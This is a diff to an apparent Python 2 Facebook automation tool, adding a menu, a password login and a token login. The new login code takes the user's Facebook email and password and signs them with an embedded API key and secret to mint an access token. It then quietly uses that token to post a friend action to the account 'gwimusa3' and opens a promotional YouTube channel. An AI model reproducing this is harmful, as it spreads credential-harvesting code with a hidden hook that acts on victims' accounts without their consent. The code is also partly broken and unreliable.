@@ -131,11 +131,105 @@ def pilih_masuk():
 		print"\033[1;97m[\033[1;91m!\033[1;97m] Harap Isi Dengan Benar !"
 		pilih_masuk()
 		
-#####LOGIN_TOKENZ#####
+def login():
+	os.system('clear')
+	print logo
+	print 42*"\033[1;97m="
+	print "\033[1;91m>>>\033[1;91m[1]\033[1;93m Login with Facebook  "
+        time.sleep(0.05)
+        print "\033[1;91m>>>\033[1;91m[2]\033[1;94m Login with access token "
+        time.sleep(0.05)
+        print "\033[1;91m>>>\033[1;91m[3]\033[1;93m Download Access token"
+	time.sleep(0.05)
+	print "\033[1;91m>>>\033[1;91m[0]\033[1;96m Logout        "
+        print 42*"\033[1;97m="
+	pilih_login()
+
+def pilih_login():
+	peak = raw_input("\n\033[1;91mChoose an Option═╬══►\033[1;95m")
+	if peak =="":
+		print "\x1b[1;91mFill in correctly"
+		pilih_login()
+	elif peak =="1":
+		login1()
+        elif peak =="2":
+	        tokenz()
+        elif peak =="3":
+	        os.system('xdg-open https://play.google.com/store/apps/details?id=com.proit.thaison.getaccesstokenfacebook')
+	        login()
+	elif unikers =="0":
+		jalan('Token Removed')
+		os.system('rm -rf login.txt')
+		keluar()
+	else:
+		print "\x1b[1;91mFill in correctly"
+		pilih()
+			
+			
+def login1():
+	os.system('clear')
+	try:
+		toket = open('login.txt','r')
+		menu() 
+	except (KeyError,IOError):
+		os.system('clear')
+                time.sleep(0.05)
+		print logo
+		print 42*"\033[1;97m="
+		jalan('\033[1;96m[✾]\x1b[1;91mDO NOT USE OLD ACCOUNT TO LOGIN\x1b[1;96m[✾]' )
+		jalan('\033[1;96m[✾]\x1b[1;91mUSE A FRESH/NEW ACCOUNT TO LOGIN\x1b[1;96m[✾]' )
+		id = raw_input('\033[1;96m[!!] \x1b[0;34mID/Email \x1b[1;91m: \x1b[1;92m')
+		pwd = raw_input('\033[1;96m[!!] \x1b[0;34mPassword \x1b[1;91m: \x1b[1;92m')
+		print 42*"\033[1;97m="
+		tik()
+		try:
+			br.open('https://m.facebook.com')
+		except mechanize.URLError:
+			print"\n\x1b[1;97mThere is no internet connection"
+			keluar()
+		br._factory.is_html = True
+		br.select_form(nr=0)
+		br.form['email'] = id
+		br.form['pass'] = pwd
+		br.submit()
+		url = br.geturl()
+		if 'save-device' in url:
+			try:
+				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
+				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
+				x=hashlib.new("md5")
+				x.update(sig)
+				a=x.hexdigest()
+				data.update({'sig':a})
+				url = "https://api.facebook.com/restserver.php"
+				r=requests.get(url,params=data)
+				z=json.loads(r.text)
+				unikers = open("login.txt", 'w')
+				unikers.write(z['access_token'])
+				unikers.close()
+				jalan( '\n\x1b[1;95mLogin Successful...') 
+				os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
+				menu()
+			except requests.exceptions.ConnectionError:
+				print"\n\x1b[1;97mThere is no internet connection"
+				keluar()
+		if 'checkpoint' in url:
+			print("\n\x1b[1;97mCHECK YOUR ACCOUNT IS CHECKPOINT")
+			os.system('rm -rf login.txt')
+			time.sleep(1)
+			keluar()
+		else:
+			print("\n\x1b[1;93mPassword/Email is wrong")
+			os.system('rm -rf login.txt')
+			time.sleep(1)
+			login()
+
 def tokenz():
 	os.system('clear')
 	print logo
-	toket = raw_input("\033[1;97m[\033[1;39m?\033[1;97m] \33[31;1mToken : \33[31;1m")
+	print 42*"="
+	toket = raw_input("\033[1;91m[+]\033[1;92m Give Token\033[1;91m :\033[1;95>>\033[1;93m ")
 	try:
 		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
 		a = json.loads(otw.text)
@@ -143,14 +237,16 @@ def tokenz():
 		zedd = open("login.txt", 'w')
 		zedd.write(toket)
 		zedd.close()
-		jalan ('\033[1;97mYou MUST FOLLOW ME FB ALC TO WORK SUCCEEFUL :) ')
-		print '\033[1;97m[\033[1;39m✓\033[1;97m]\033[1;39m Welcome'
-		os.system('xdg-open  https://www.facebook.com/karma428')
-		bot_komen()
+		menu()
 	except KeyError:
-		print "\033[1;97m[\033[1;39m!\033[1;97m] \033[1;39mToken Salah !"
-		time.sleep(1)
-		masuk()
+		print "\033[1;91m[!] Wrong"
+		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
+		if e =="":
+			keluar()
+		elif e =="y":
+			login()
+		else:
+			keluar()
 
 
 def menu():
